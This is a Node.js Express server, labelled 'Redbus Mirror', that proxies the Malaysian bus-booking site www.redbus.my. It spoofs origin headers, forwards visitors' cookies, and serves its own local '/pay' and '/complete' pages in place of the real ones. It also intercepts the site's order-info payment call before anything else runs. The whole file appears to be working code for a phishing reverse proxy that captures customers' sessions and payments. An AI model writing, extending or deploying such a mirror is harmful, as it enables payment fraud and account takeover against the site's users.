import 'dotenv/config';
import express from 'express';
import http from 'http';
import https from 'https';
import { createRedbusProxy } from './proxy.js';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));

process.on('uncaughtException', (err) => { console.error('[FATAL]', err.message); });
process.on('unhandledRejection', (reason) => { console.error('[REJECT]', reason); });

const PORT = parseInt(process.env.PORT || '3000');
const TARGET_HOST = 'www.redbus.my';
const app = express();

// Manual proxy for orderInfo - read raw body from request stream
function forwardOrderInfo(req, res) {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    const body = Buffer.concat(chunks);
    const headers = {
      'Content-Type': req.headers['content-type'] || 'application/json',
      'Content-Length': String(body.length),
      'Host': TARGET_HOST,
      'Origin': 'https://' + TARGET_HOST,
      'Referer': 'https://' + TARGET_HOST + '/',
      'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
      'Accept': '*/*',
      'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    };
    // Forward browser cookies (needed for session/auth)
    if (req.headers.cookie) headers['Cookie'] = req.headers.cookie;
    console.log('[orderInfo] Forwarding body size:', body.length, 'has cookie:', !!req.headers.cookie);
    const proxyReq = https.request({
      hostname: TARGET_HOST,
      path: req.url,
      method: 'POST',
      headers,
    }, proxyRes => {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    });
    proxyReq.on('error', err => { console.error('[orderInfo]', err.message); if (!res.headersSent) res.status(502).send('Bad gateway'); });
    proxyReq.write(body);
    proxyReq.end();
  });
}

// OrderInfo — FIRST middleware, catches before anything else
app.use((req, res, next) => {
  if (req.method === 'POST' && req.url.startsWith('/redPay/api/orderInfo')) {
    forwardOrderInfo(req, res);
    return;
  }
  next();
});

const mainProxy = createRedbusProxy(process.env.PUBLIC_HOST || `localhost:${PORT}`);

app.use('/pay', express.static(join(__dirname, '..', 'public', 'pay')));
app.use('/complete', express.static(join(__dirname, '..', 'public', 'complete')));
app.use('/', ...mainProxy);

const server = http.createServer(app);
server.timeout = 120000;
server.keepAliveTimeout = 65000;

server.listen(PORT, '0.0.0.0', () => console.log(`[Redbus Mirror] Port ${PORT}`));
